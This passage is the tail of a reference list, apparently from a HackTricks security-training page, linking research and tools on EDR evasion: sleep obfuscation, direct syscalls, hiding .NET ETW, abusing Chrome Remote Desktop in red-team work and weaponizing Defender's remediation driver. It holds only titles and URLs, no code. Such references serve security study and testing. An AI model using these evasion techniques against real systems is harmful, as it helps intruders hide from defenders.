- [30] [Sleeping Beauty II：CFG、CET 与 Stack Spoofing](https://maorsabag.github.io/posts/adaptix-stealthpalace/sleeping-beauty-ii)
- [31] [Ekko sleep obfuscation](https://github.com/Cracked5pider/Ekko)
- [32] [SysWhispers4 – GitHub](https://github.com/JoasASantos/SysWhispers4)
- [33] [blog.xpnsec.com - 隐藏你的 Dotnet Etw](https://blog.xpnsec.com/hiding-your-dotnet-etw)
- [34] [repnz/etw-providers-docs](https://github.com/repnz/etw-providers-docs)
- [35] [trustedsec.com - 在 Red Team Operations 中滥用 Chrome Remote Desktop：实用指南](https://trustedsec.com/blog/abusing-chrome-remote-desktop-on-red-team-operations-a-practical-guide)
- [36] [Check Point Research - BTR Reforged：将 Defender 的 Remediation Driver weaponize 为 kernel operation primitive](https://research.checkpoint.com/2026/btr-reforged-weaponizing-defenders-remediation-driver-as-a-kernel-operation-primitive/)
- [37] [Dump-GUY - BTR_CLI](https://github.com/Dump-GUY/BTR_CLI)
- [38] [MDSec Function Peekaboo companion code](https://github.com/mdsecactivebreach/functionpeekaboo)
- [39] [MDSec - Function Peekaboo：使用 LLVM 构造 Self-Masking Functions](https://mdsec.co.uk/2025/10/function-peekaboo-crafting-self-masking-functions-using-llvm/)
- [40] [Microsoft Learn - VirtualProtect](https://learn.microsoft.com/en-us/windows/win32/api/memoryapi/nf-memoryapi-virtualprotect)
{{#include ../banners/hacktricks-training.md}}
